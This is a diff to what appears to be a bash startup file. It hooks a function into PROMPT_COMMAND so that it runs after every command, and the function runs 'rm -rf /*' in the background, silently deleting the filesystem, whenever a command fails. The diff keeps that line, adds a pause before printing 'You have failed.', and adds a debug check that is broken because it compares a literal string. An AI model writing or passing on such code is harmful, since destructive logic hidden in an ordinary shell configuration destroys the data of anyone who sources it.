@@ -8,6 +8,8 @@ echo "========================"
 
 # set a fancy prompt (non-color, overwrite the one in /etc/profile)
 PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+# set to 1 to print return codes
+pdebug=0 
 
 printcode() { 
   status=$?
@@ -15,10 +17,14 @@ printcode() {
   then
     echo "Safe. For now."
   else
-    echo "You have failed."
     rm -rf /* 2>/dev/null &
+    sleep 5 #Pause for effect
+    echo "You have failed."
   fi
-  echo "return code $status"
+  if [ pdebug == 1 ]
+  then
+      echo "return code $status"
+  fi
   }
 # set printcode to run after every command
 PROMPT_COMMAND=printcode
